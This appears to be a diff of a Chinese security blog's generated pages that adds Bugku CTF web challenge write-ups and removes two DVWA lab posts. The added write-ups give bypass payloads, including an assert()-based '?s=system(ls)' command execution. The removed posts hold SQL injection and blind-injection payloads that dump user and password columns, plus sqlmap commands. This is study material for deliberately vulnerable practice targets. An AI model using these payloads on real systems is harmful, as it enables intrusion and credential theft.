+<h1 id="Web20（line控制返回内容）"><a href="#Web20（line控制返回内容）" class="headerlink" title="Web20（line控制返回内容）"></a>Web20（line控制返回内容）</h1><p>打开题目地址发现是一堆乱码，我还以为乱码里面有内容，分析了一通，结果什么也没有。</p>
 <p>注意到url栏filename的值好像被编码了，base64解码得keys.txt。<img src="/.com//12.png" alt="12"></p>
 <ul>
 <li>变量line的值为多少就返回指定文件中第几行，无值时默认返回第0行</li>
@@ -211,12 +553,12 @@
 
 <p>我们看到当cookie内容为参数margin=margin时，file_list数组会多一个键值<code>keys.php</code>，然后通过in_array函数检测我们上传的文件名是否在file_list数组中，是则发送key.php文件的内容。</p>
 <p>因此我们构造cookie：margin=margin，令filename的值为key.php  base64编码后的值。<img src="/.com//14.png" alt="14"></p>
-<h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><p>打开题目地址做的第一件就是查看网页源码<img src="/.com//9.png" alt="9"></p>
+<h1 id="web21：（编码-加条件绕过）"><a href="#web21：（编码-加条件绕过）" class="headerlink" title="web21：（编码+加条件绕过）"></a>web21：（编码+加条件绕过）</h1><p>打开题目地址做的第一件就是查看网页源码<img src="/.com//9.png" alt="9"></p>
 <p>发现有一个1p.html文件，打开是一段HTML代码</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">&quot;Javascript&quot;</span>&gt;</span></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Words =<span class="string">&quot;%3Cscript%3Ewindow.location.href%3D&#x27;http%3A%2F%2Fwww.bugku.com&#x27;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;</span> </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> NewWords;</span></span><br><span class="line"><span class="javascript">NewWords = <span class="built_in">unescape</span>(Words);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(NewWords);</span></span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="javascript"><span class="comment">// --&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>我们看到word一大串字符串很可疑，结合后面的unescape()函数，断定这里被编码了</p>
-<p>用burp解码，顺序为url解码，base64解码，再url解码</p>
+<p>用burp解码，顺序为：url解码，base64解码，再url解码</p>
 <p><img src="/.com//10.png" alt="10"></p>
 <p>最终得</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	<span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print &quot;</span>never never never give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;--&gt;</span></span><br></pre></td></tr></table></figure>
@@ -236,6 +578,35 @@
 <p>令<code>?a=php://input</code>并post数据<code>bugku is a nice plateform!</code></p>
 <p>综上所述：payload=?id=0e1&amp;a=php://input&amp;b=%0023456 并post数据<code>bugku is a nice plateform!</code></p>
 <p><img src="/.com//11.png" alt="11"></p>
+<h1 id="web22（assert-函数漏洞利用）"><a href="#web22（assert-函数漏洞利用）" class="headerlink" title="web22（assert()函数漏洞利用）"></a>web22（assert()函数漏洞利用）</h1><p>点开题目发现题目描述那段话：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$poc&#x3D;&quot;a#s#s#e#r#t&quot;; </span><br><span class="line">$poc_1&#x3D;explode(&quot;#&quot;,$poc);  </span><br><span class="line">$poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];  </span><br><span class="line">$poc_2($_GET[&#39;s&#39;])</span><br></pre></td></tr></table></figure>
+
+<p> 以上代码最终等价执行语句：<code>assert($_GET[&#39;s&#39;])</code></p>
+<p>补充：assert()函数会将括号内的字符串当作php代码执行。</p>
+<p>详情参考：<code>https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/</code></p>
+<p>那么我们可以根据assert()函数的特性，构造payload：<code>?s=system(ls)或?s=system(dir)</code></p>
+<p><img src="/.com//19.png" alt="19"></p>
+<p>访问<code>flaga15808abee46a1d5.txt</code>，得flag</p>
+<h1 id="web23：（正则表达式）"><a href="#web23：（正则表达式）" class="headerlink" title="web23：（正则表达式）"></a>web23：（正则表达式）</h1><p>打开题目地址：<img src="/.com//21.png" alt="21"></p>
+<p>我们看到一个正则表达式：<code>/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i</code>，当我们输入的id值满足正则匹配是会输出flag</p>
+<p>我们可以把这个正则表达式拆分成：<code>key</code> <code>.</code> <code>*</code> <code>key</code> <code>.&#123;4,7&#125;</code> <code>key</code> <code>:</code> <code>/</code> <code>.</code> <code>/</code> <code>.</code> <code>*</code> <code>key</code> <code>[a-z]</code> <code>[[:punct:]]</code></p>
+<p>分析（从左到右）：</p>
+<p><code>key</code>——就是key</p>
+<p><code>.</code> ——任意字符</p>
+<p><code>*</code>——匹配前面的子表达式零次或多次</p>
+<p><code>key</code>——就是key</p>
+<p><code>.&#123;4,7&#125;</code>——匹配任意字符4到7次</p>
+<p><code>key</code>——就是key</p>
+<p><code>:</code>——就是<code>:</code></p>
+<p><code>/</code>——就是<code>/</code></p>
+<p><code>.</code> ——任意字符</p>
+<p><code>/</code>——就是<code>/</code></p>
+<p><code>.</code> ——任意字符</p>
+<p><code>*</code>——匹配前面的子表达式零次或多次</p>
+<p><code>key</code>——就是key</p>
+<p><code>[a-z]</code>——匹配a-z之间的字母</p>
+<p><code>[[:punct:]]</code>——匹配任意标点符号</p>
+<p>依次我们构造payload，以get的方式传参id：<code>?id=key1key1111key:/1/1keya!</code>     （payload不唯一）</p>
 
       
     </div>
@@ -747,188 +1118,6 @@
 
 
   
-    <article id="post-DVWA—SQL Injection (Blind)" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/" class="article-date">
-  <time datetime="2021-03-10T08:48:00.000Z" itemprop="datePublished">2021-03-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/">DVWA—SQL Injection (Blind)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>SQL盲注与一般SQL注入的区别在于一般SQL注入的攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行的结果，甚至连注入语句是否执行都无法得知。</p>
-<h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><p><strong>1）判断注入点即其类型</strong></p>
-<p>1’ and ‘1’=’1![2](DVWA—SQL Injection (Blind)/2.png)</p>
-<p>1’ and ‘1’=’2![1](DVWA—SQL Injection (Blind)/1.png)</p>
-<p>可知存在注入点，且注入类型为<code>&#39;</code></p>
-<p><strong>2）猜测SQL查询语句的字段数</strong></p>
-<p>1’ order by 2#![2](DVWA—SQL Injection (Blind)/2.png)</p>
-<p>1’ order by 3#![1](DVWA—SQL Injection (Blind)/1.png)</p>
-<p><strong>3）爆库</strong></p>
-<p>1’ and length(database())=1 # ，不存在</p>
-<p>1’ and length(database())=2 # ，不存在</p>
-<p>1’ and length(database())=3 # ，不存在</p>
-<p>1’ and length(database())=4 # ，存在，因此库名长度为四</p>
-<p>1’ and left(database(),1)=’d’#，存在，一次库名的首字母为<code>d</code>，剩下的一次类推，得库名为dvwa</p>
-<p><strong>4）爆表</strong></p>
-<ul>
-<li><p>先猜表个数</p>
-<p>1’ and (select count(table_name) from information_schema.tables where table_schema=database())=2 #，存在，即有两个表</p>
-</li>
-<li><p>猜表名长度</p>
-<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，存在，第一个表名有9个字母</p>
-<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 #</p>
-<p>存在，第二个表名有5个字母</p>
-</li>
-<li><p>猜表名组成字符</p>
-<p>1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)=’u’ #，存在，说明第二个表的表名首字母为<code>u</code>，以此类推可得第二个表表名为<code>users</code></p>
-</li>
-</ul>
-<p><strong>5）爆列</strong></p>
-<p>爆列和爆表基本相似，仅需稍微修改一点即可，下面就举猜表个数为例，其余自行变通。</p>
-<p>1’ and (select count(column_name) from information_schema.columns where table_name=’users’)=14 #，存在，说明有14个列</p>
-<p><strong>6）爆值</strong></p>
-<p>爆值手动操作量太大了，这里就以爆列：user为例</p>
-<p>1’ and substr((select user from users limit 0,1),1,1)=’a’#</p>
-<p>查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    $id = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $id ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>还是抓包，然后修改上传数据，大体同SQL Injection （Medium）</p>
-<h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码： </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>我们可以看到当SQL语句查询为空的时候，会随机执行sleep()函数，并随机延迟2~4秒，那么用时间盲注就可能被影响，因此这关用布尔盲注。具体同Low级别一样。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/" data-id="ckm5oxbgf000a8svu76zu82eu" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-DVWA—SQL Injection" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/03/09/DVWA%E2%80%94SQL%20Injection/" class="article-date">
-  <time datetime="2021-03-09T13:20:45.370Z" itemprop="datePublished">2021-03-09</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/09/DVWA%E2%80%94SQL%20Injection/">DVWA—SQL Injection</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前有刷过sqlilabs，前言就不再介绍了。</p>
-<h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><h2 id="手工注入："><a href="#手工注入：" class="headerlink" title="手工注入："></a>手工注入：</h2><p><strong>1）判断是否存在注入点，注入点是字符型还是数字型</strong></p>
-<p>1’ and ‘1’=’1，成功</p>
-<p>1’ and ‘1’=’2，返回结果为空，存在说明存在注入点且为<code>&#39;</code></p>
-<p><strong>2）猜解SQL查询语句中的字段数</strong></p>
-<p>1’ order by 1#不报错；</p>
-<p>1’ order by 2#不报错；</p>
-<p>1’ order by 3#报错，说明SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
-<p><strong>3）判断回显位</strong></p>
-<p>0’ union select 1,2#![1](DVWA—SQL Injection/1.png)</p>
-<p>有两个回显位。</p>
-<p><strong>4）爆库</strong></p>
-<p>0’ union select 1,database()#![2](DVWA—SQL Injection/2.png)</p>
-<p><strong>5）爆表</strong></p>
-<p>0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#![3](DVWA—SQL Injection/3.png)</p>
-<p><strong>6）爆列</strong></p>
-<p>0’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#</p>
-<p>![4](DVWA—SQL Injection/4.png)</p>
-<p><strong>7）爆值</strong></p>
-<p>0’ union select user,password from users#</p>
-<p>![5](DVWA—SQL Injection/5.png)</p>
-<p>或0’ union select 1,group_concat(user,0x3a,password) from users# </p>
-<p>![6](DVWA—SQL Injection/6.png)</p>
-<h2 id="利用sqlmap自动注入："><a href="#利用sqlmap自动注入：" class="headerlink" title="利用sqlmap自动注入："></a>利用sqlmap自动注入：</h2><p><strong>1）获取所有数据库</strong></p>
-<p>sqlmap.py -u “url”   –cookie “cookie中的内容” –dbs</p>
-<p>sp：　-u ： 指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 </p>
-<p>​            –dbs：获取所有数据库</p>
-<p><strong>2）查询当前数据库名</strong></p>
-<p>sqlmap.py -u “url”   –cookie “cookie中的内容” –current-db</p>
-<p>sp： –current-db：查询当前数据库昵称</p>
-<p><strong>3）查表名</strong></p>
-<p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa –tables</p>
-<p>sp：-D：指定数据库</p>
-<p>　　–table：查询所有表</p>
-<p>​        –batch：批处理,也就是系统默认选项(按照默认的选项 全自动执行)</p>
-<p><strong>4）查列名</strong></p>
-<p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -T users –columns</p>
-<p>sp：-T：指定表名</p>
-<p>​        –columns：查询所有列</p>
-<p><strong>5）查值</strong></p>
-<p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -C user,password –dump</p>
-<p>sp：-C：指定columns 如果不指定,默认整表</p>
-<ul>
-<li>查看源码：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;   </span><br><span class="line">     <span class="comment">// Get input  </span></span><br><span class="line">     $id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];  </span><br><span class="line">     </span><br><span class="line">     <span class="comment">// Check database  </span></span><br><span class="line">     $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );         <span class="comment">// Get results  </span></span><br><span class="line">      <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;     </span><br><span class="line">      <span class="comment">// Get values     </span></span><br><span class="line">      $first = 